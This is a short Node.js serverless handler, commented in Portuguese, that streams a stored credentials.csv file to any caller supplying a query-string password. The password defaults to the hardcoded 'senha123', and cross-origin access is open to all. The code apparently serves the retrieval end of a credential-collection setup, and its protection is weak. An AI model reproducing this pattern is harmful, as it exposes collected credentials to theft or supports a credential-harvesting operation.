const fs = require('fs');
const path = require('path');

// Senha simples para proteger o download (configure uma variável de ambiente)
const DOWNLOAD_PASSWORD = process.env.DOWNLOAD_PASSWORD || 'senha123';

module.exports = (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    // Apenas aceitar GET
    if (req.method !== 'GET') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Verificar senha via query parameter
        const password = req.query.password;
        
        if (password !== DOWNLOAD_PASSWORD) {
            return res.status(401).json({ error: 'Unauthorized' });
        }

        const CSV_FILE = path.join('/tmp', 'credentials.csv');

        // Verificar se o arquivo existe
        if (!fs.existsSync(CSV_FILE)) {
            return res.status(404).json({ error: 'Arquivo CSV não encontrado' });
        }

        // Enviar arquivo
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename="credentials.csv"');
        
        const fileStream = fs.createReadStream(CSV_FILE);
        fileStream.pipe(res);

    } catch (error) {
        console.error('Erro ao baixar CSV:', error);
        res.status(500).json({ error: 'Erro ao processar requisição' });
    }
};
